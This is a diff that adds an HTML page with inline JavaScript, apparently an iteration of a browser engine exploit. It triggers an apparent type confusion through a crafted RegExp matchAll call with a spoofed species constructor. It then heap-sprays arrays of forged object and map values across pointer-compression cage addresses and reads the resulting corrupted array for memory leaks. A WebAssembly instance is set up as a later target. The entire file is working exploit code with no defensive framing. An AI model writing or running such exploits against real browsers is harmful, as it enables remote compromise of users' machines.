@@ -1,0 +1,76 @@
+<!doctype html><html><head><meta charset="utf-8"><title>P19</title></head>
+<body><pre id="out">Running...</pre>
+<script>
+"use strict";
+const O=document.getElementById("out");
+function log(s){O.textContent+="\n"+s;}
+const cvt=new ArrayBuffer(8);const f64=new Float64Array(cvt);
+const u64=new BigUint64Array(cvt);const u32=new Uint32Array(cvt);
+function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
+function f2i(f){f64[0]=f;return u64[0];}
+function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
+function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
+
+const DMAP=0x1032a5d,EMPTY=0x7e5,MAXS=0x7fdffffe;
+// Try 8 different PINs spread across cage
+const PINS=[0x40011,0x80011,0xC0011,0x100011,0x140011,0x180011,0x200011,0x280011];
+const dbl=new Array(0x8000);for(let i=0;i<dbl.length;i++)dbl[i]=10.125+i*0.001;
+const obj=new Array(0x8000);for(let i=0;i<obj.length;i++)obj[i]=null;
+const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
+  new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
+const victim=[1.22,1.33,1.44];
+const re=/(?:)/;
+const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
+const c0=w2f(DMAP,EMPTY);
+// spray pattern value for cycle0 comparison
+const CYCLE0=f2i(c0);
+const sk=[];
+
+log("UA: "+navigator.userAgent);
+trash(230);trash(230);
+RegExp.prototype[Symbol.matchAll].call(fk,"").next();
+log("TRIG: "+re.lastIndex);
+trash(230);trash(230);
+
+// Spray with multiple PINs - each round uses a different PIN
+for(let r=0;r<PINS.length;r++){
+  const pin=PINS[r];
+  const c1=w2f(pin,MAXS);
+  for(let i=0;i<9;i++){
+    const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);
+    for(let j=1;j<a.length;j+=2)a[j]=c1;
+    sk.push(a);
+  }
+}
+
+try{
+const m=re.lastIndex;
+log("T: "+typeof m+" A="+Array.isArray(m));
+if(Array.isArray(m)){
+  log("L: "+m.length);
+  // Read m[0..3] to identify which PIN materialized
+  const d=[];
+  for(let k=0;k<4;k++){try{d.push(f2i(m[k]).toString(16));}catch(e){d.push("E");}}
+  log("D: "+d.join(","));
+  
+  // Check if m[0] matches any known pattern
+  const m0=f2i(m[0]);
+  if(m0===CYCLE0)log("SPRAY_OVERLAP!");
+  
+  // Check m[0] value to guess which PIN
+  // PIN determines elements address, m[0] reads from PIN_base+8
+  // Each PIN reads different data - report for correlation
+  log("M0: "+m0.toString(16)+" C0: "+CYCLE0.toString(16));
+  
+  // Also read header area to find which PIN was used
+  const hdr=[];
+  for(let k=0x7FFC;k<=0x8003;k++){
+    try{hdr.push(f2i(m[k]).toString(16).slice(-10));}catch(e){hdr.push("E");break;}
+  }
+  log("HDR: "+hdr.join(","));
+  
+  log("W: "+wasmI.exports.f());
+}else{log("NO_ARR");}
+}catch(e){log("E: "+e.message);}
+log("=== DONE ===");
+</script></body></html>
